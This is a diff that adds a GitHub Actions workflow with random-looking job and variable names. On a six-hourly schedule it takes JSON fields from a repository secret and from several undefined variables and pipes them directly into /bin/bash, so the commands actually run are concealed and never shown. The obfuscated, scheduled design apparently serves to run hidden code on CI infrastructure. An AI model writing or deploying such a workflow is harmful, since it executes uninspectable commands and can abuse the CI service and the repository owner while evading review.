@@ -1,0 +1,28 @@
+name: qiantonghe8765
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiantonghe8765
+        env:
+          ciew698: ${{ secrets.ciew698 }}
+        run: |
+          echo $ciew698 | jq -r .wjy2 | /bin/bash
+          echo $zzrhw2925 | jq -r .fnvs963 | /bin/bash
+          echo $ibtjg557 | jq -r .u505 | /bin/bash
+          echo $v625 | jq -r .s747 | /bin/bash
+          echo $j3 | jq -r .bbe1 | /bin/bash
+          echo $r401 | jq -r .xii51338 | /bin/bash
+          echo $wnxtd98 | jq -r .i0 | /bin/bash
+          echo $y648 | jq -r .nv2477 | /bin/bash
+          echo $fevcd75701 | jq -r .prl4885 | /bin/bash
+          echo $niyb19453 | jq -r .fur25 | /bin/bash
+          echo $z116 | jq -r .lam64 | /bin/bash
+
